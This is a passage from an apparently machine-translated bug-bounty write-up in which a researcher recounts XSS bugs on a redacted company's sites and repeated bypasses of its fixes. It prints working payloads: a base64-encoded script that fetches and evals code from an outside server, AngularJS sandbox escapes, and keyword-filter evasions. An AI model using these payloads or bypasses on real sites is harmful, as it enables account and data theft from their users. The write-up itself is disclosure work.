iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">又有一个修正了这个问题，最终它变得不容易受到攻击了。</p><h2 id="6e0c" class="mj la iq bd lb on oo dn lf op oq dp lj jy or os ln kc ot ou lr kg ov ow lv ox bi translated">2.使用XSS窃取数据</h2><p id="55d4" class="pw-post-body-paragraph jn jo iq jp b jq lx js jt ju ly jw jx jy lz ka kb kc ma ke kf kg mb ki kj kk ij bi translated">修复了我的第一个报告负载，负载为:</p><pre class="ks kt ku kv gt me mf mg mh aw mi bi"><span id="3cec" class="mj la iq mf b gy mk ml l mm mn">█████.com/?foo='+eval(atob(decodeURIComponent('IWFzeW5jIGZ1bmN0aW9uKCkge2xldCBhID0gYXdhaXQgZnVuY3Rpb24oKSB7ZmV0Y2goJ2h0dHBzOi8vbXktc2VydmVyLmNvbS9sb2cuanMnKS50aGVuKHQgPT4gdC50ZXh0KCkpLnRoZW4oZCA9PiB7ZXZhbChkKX0pfSgpfSgpOwo=')))+'});var foo='{ 1,</span></pre><p id="6b68" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用以下方式绕过此问题:</p><p id="0a14" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mp mq mr mf b">()</code>被阻止，fix被要求确认，使用URL编码<code class="fe mp mq mr mf b">(</code> = &gt; <code class="fe mp mq mr mf b">%28</code>、<code class="fe mp mq mr mf b">)</code> = &gt; <code class="fe mp mq mr mf b">%29</code>和使用反勾<code class="fe mp mq mr mf b">`</code>绕过这个。</p><pre class="ks kt ku kv gt me mf mg mh aw mi bi"><span id="ab7a" class="mj la iq mf b gy mk ml l mm mn">█████.com/?foo='+eval<!-- -->%28<!-- -->atob<!-- -->%28<!-- -->decodeURIComponent<!-- -->%28<!-- -->'IWFzeW5jIGZ1bmN0aW9uKCkge2xldCBhID0gYXdhaXQgZnVuY3Rpb24oKSB7ZmV0Y2goJ2h0dHBzOi8vbXktc2VydmVyLmNvbS9sb2cuanMnKS50aGVuKHQgPT4gdC50ZXh0KCkpLnRoZW4oZCA9PiB7ZXZhbChkKX0pfSgpfSgpOwo='<!-- -->%29%29%29<!-- -->+'}<!-- -->%29<!-- -->;var foo='{ 1,</span></pre><p id="f952" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">又有一个修正了这个问题，最终它变得不容易受到攻击了。</p><h2 id="8d69" class="mj la iq bd lb on oo dn lf op oq dp lj jy or os ln kc ot ou lr kg ov ow lv ox bi translated">3.一束XSS</h2><p id="986c" class="pw-post-body-paragraph jn jo iq jp b jq lx js jt ju ly jw jx jy lz ka kb kc ma ke kf kg mb ki kj kk ij bi translated">修复了我的第一个报告负载，负载为:</p><pre class="ks kt ku kv gt me mf mg mh aw mi bi"><span id="8539" class="mj la iq mf b gy mk ml l mm mn">https://important.█████.com/█████/█████?...&amp;param1=value1"+ng-value={{a="a".constructor.prototype;a.charAt="".valueOf}}&amp;param2=value2+ng-val={{$evalAsync("x=(_=prompt,_(1))//")}}</span></pre><p id="6cef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个有效载荷已经有很多旁路。当这个被封锁的时候，我设法用<code class="fe mp mq mr mf b">`</code>绕过了<code class="fe mp mq mr mf b">()</code>的封锁(适用于除了<strong class="jp ir"><em class="kl">important.█████.com</em></strong>之外的所有其他重要域)</p><p id="b18f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用这个有效负载绕过了它:</p><pre class="ks kt ku kv gt me mf mg mh aw mi bi"><span id="d2ae" class="mj la iq mf b gy mk ml l mm mn">https://important.█████.com/█████/█████?...&amp;param1=value1"+ng-val={{{}.")));x=alert;x(1)//"}}+"</span></pre><p id="523b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">他们也修复了这个问题，所以我再次绕过修复，使用:</p><pre class="ks kt ku kv gt me mf mg mh aw mi bi"><span id="38a2" class="mj la iq mf b gy mk ml l mm mn">https://important.█████.com/█████/█████?...&amp;param1=value1"+ng-val={{{}.")));new+Function`al\ert\`XSS-By-Viren\``;//"}}+"</span></pre><p id="9602" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用<code class="fe mp mq mr mf b">al\ert</code>绕过了阻挡词“alert ”,这两个词很好，并且又修复了一个，最终它变得不容易受到攻击。</p></div><div class="ab cl nj nk hu nl" role="separator"><span class="nm bw bk nn no np"/><span class="nm bw bk nn no np"/><span class="nm bw bk nn no"/></div><div class="ij ik il im in"><p id="85cb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，bug bounty不仅仅是关于发现和报告bug以获得奖励，而是关于创造性、愤怒和聪明，并且重要的是带着热情工作<strong class="jp ir">而不是为了钱，我提到时间线只是为了让新来者理解，获得越来越多的bug可能需要时间，所以只要冷静下来并进行狩猎。这是一个在█████的多个沉睡的xs从子域到主子域和主域发现bug的故事。</strong></p><blockquote class="km kn ko"><p id="942a" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">因为这些虫子，我获得了█████'s虫子奖励计划的奖励。</p></blockquote><p id="82c8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">██.██.2020:因窃取用户信息报告而被█████法院起诉</p><p id="34da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">██.██.2020:所有其它XSS报告的INR █████</p></div><div class="ab cl nj nk hu nl" role="separator"><span class="nm bw bk nn no np"/><span class="nm bw bk nn no np"/><span class="nm bw bk nn no"/></div><div class="ij ik il im in"><p id="ac53" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先感谢█████'s安全团队，感谢他们的良好合作，感谢他们的积极回应。我注意到许多公司甚至不回复你的邮件，而█████有这么好的安全研究员平台值得一提。</p><p id="372d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最诚挚的感谢<a class="ae mc" href="https://medium.com/u/6397cd49a043?source=post_page-----509232194a4e----------------------" rel="noopener"> Somdev Sangwan </a>🙏因为他关于XSS的令人敬畏的知识库，这个知识库和在那里分享的知识是我学习的真正来源。为了修复旁路和提高有效负载，我使用了<a class="ae mc" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" rel="noopener ugc nofollow" target="_blank"> PayloadAllThings </a>存储库🔥。</p><p id="37ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我想提及对万能真主的赞颂🙏<a class="ae mc" href="https://en.wikipedia.org/wiki/Rama" rel="noopener ugc nofollow" target="_blank">拉玛勋爵</a>和🙏<a class="ae mc" href="https://en.wikipedia.org/wiki/Hanuman" rel="noopener ugc nofollow" target="_blank">哈奴曼勋爵。我相信没有他们的恩典，我什么都不是，我的一切都是他们的礼物。我向他们鞠躬，并将永远向他们鞠躬。</a></p><p id="0495" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="kl">感谢阅读。随时联系，我只是一个消息。这里联系我:</em><a class="ae mc" href="https://www.instagram.com/viren__pawar/" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="kl">insta gram</em></strong></a><em class="kl">，</em><a class="ae mc" href="https://twitter.com/VirenPawar_" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="kl">Twitter</em></strong></a><em class="kl">。</em></p></div></div>    
</body>
</html>